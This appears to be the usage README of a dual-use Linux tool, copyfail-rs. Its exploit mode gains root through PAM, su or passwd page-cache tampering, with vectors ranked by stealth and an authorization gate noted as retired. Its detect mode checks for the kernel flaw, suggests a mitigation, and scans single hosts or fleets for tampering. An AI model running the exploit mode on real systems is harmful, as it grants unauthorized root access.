# copyfail-rs, usage

One-screenful examples per mode. Output blocks are the real binary's output, not editorialized.

Run the binary unprivileged. It calls into AF_ALG / splice / sudo itself; no `sudo copyfail` needed.

## Exploit mode

### Basic, auto-pick best vector and drop a root shell

```
$ copyfail --mode exploit
[sudo] password for noot:
root@host:~# id
uid=0(root) gid=0(root) groups=0(root)
```

Default `--vector auto`: ranks `pam > su > passwd` by stealth, picks the first applicable. PAM bypass becomes active in the page cache; the binary then opens a PTY, execs `sudo -k -S -i`, feeds it any password through stdin, the bypass returns success, you get the relayed root shell.

### List applicable vectors

```
$ copyfail --mode exploit --vector list
Vector applicability on this host:

  pam       APPLICABLE      high    /etc/pam.d/{common,system}-auth present, mutable auth line found
  su        APPLICABLE      high    /usr/bin/su present, setuid root, payload primable
  passwd    APPLICABLE      medium  /etc/passwd readable, current uid in 1000..=9999

Kernel vulnerable: yes
Recommended order (auto): pam → su → passwd
Run with --vector auto (or `--mode exploit` with no flags) to execute the recommended chain.
```

### Try every vector in order until one succeeds

```
$ copyfail --mode exploit --vector all
[+] trying vector: pam
[+] pam: bypass active
root@host:~#
```

### Dry-run (print the plan, don't exploit)

```
$ copyfail --mode exploit --dry-run
[dry-run] requested vector: auto
[dry-run] kernel vulnerable: yes
[dry-run] would execute: pam
```

### JSON output for automation

```
$ copyfail --mode exploit --vector pam --no-shell --json
{"vector":"pam","outcome":"success","bypass_active":true,"hint":"sudo -k && echo any | sudo -S -i"}
```

## Detect mode

### --check (kernel + module + mitigation status)

```
$ copyfail --mode detect --check
=== copyfail-rs detection: --check ===
Kernel:        6.17.0-22-generic
algif_aead:    loaded=true
Template:      authencesn registered=true
Config AEAD:   m
Mitigation:    none

VERDICT:       VULNERABLE
RECOMMEND:     echo "install algif_aead /bin/false" | sudo tee /etc/modprobe.d/disable-algif.conf && sudo rmmod algif_aead
```

`--check --json` for SIEM ingest. Verdict ∈ {`VULNERABLE`, `MITIGATED`, `NOT EXPLOITABLE`, `UNKNOWN`}.

### --scan (cache vs O_DIRECT diff on critical files)

```
$ copyfail --mode detect --scan
=== copyfail-rs detection: --scan ===
Scanned 5 paths in 7ms.

CLEAN (4):
  /etc/passwd [ext4]
  /usr/bin/su [ext4]
  /etc/sudoers [ext4]
  /etc/shadow [ext4]

TAMPERED (1):
  /etc/pam.d/common-auth [ext4]
    cache:  23c4f1ee9d4a...
    disk:   117dab1c2e8b...

VERDICT:   TAMPERED
```

Default path set covers PAM configs, `/etc/passwd`, `/usr/bin/su`, sudoers. Pass extra `PATH ...` after the flag to add files. Filesystem-aware: ext4/xfs/btrfs use O_DIRECT, overlayfs falls back to `posix_fadvise(DONTNEED)`, tmpfs skipped.

### --baseline / --diff

Snapshot known-clean state, then compare a later run against it:

```
$ copyfail --mode detect --baseline /tmp/baseline.json
wrote 5 entries to /tmp/baseline.json

# ... time passes, exploitation may occur ...

$ copyfail --mode detect --diff /tmp/baseline.json
=== copyfail-rs detection: --diff ===
1 entries differ:
  [CACHE-ONLY (CopyFail signature)] /etc/pam.d/common-auth
    baseline_disk: 117dab1c...
    current_disk:  117dab1c...
    current_cache: 23c4f1ee...
```

The `--diff` argument is the **baseline JSON file**, not a target file. The disk-clean / cache-changed signature is the CopyFail fingerprint. No mainstream FIM surfaces this.

### --watch (daemon)

```
$ copyfail --mode detect --watch --interval 60
[2026-04-30T19:00:00Z] watch start, interval=60s, paths=5
[2026-04-30T19:01:00Z] scan: clean
[2026-04-30T19:02:00Z] scan: TAMPERED (1)
  /etc/pam.d/common-auth: CACHE-ONLY (CopyFail signature)
^C
[2026-04-30T19:02:14Z] watch stop (SIGTERM)
```

### --hunt (SSH fleet sweep)

```
$ cat hosts.txt
ubuntu-prod-01
ubuntu-prod-02
debian-edge-01
$ copyfail --mode detect --hunt --hosts hosts.txt --json
{"host":"ubuntu-prod-01","verdict":"vulnerable","tampered":[]}
{"host":"ubuntu-prod-02","verdict":"vulnerable","tampered":["/etc/pam.d/common-auth"]}
{"host":"debian-edge-01","verdict":"mitigated","tampered":[]}
```

Subprocesses out to `ssh`. Sequential v1; bounded-parallel pool is a follow-up.

## Exit codes

| Code | Meaning |
|------|---------|
| 0 | Success (exploit landed, scan clean, check verdict reported) |
| 1 | Generic failure / programmer error |
| 2 | (retired), was authorization-gate refusal |
| 3 | Host kernel not vulnerable |
| 4 | All vectors failed (`--vector all`) |
| 5 | Partial success with `--strict` (some vector failed before one succeeded) |
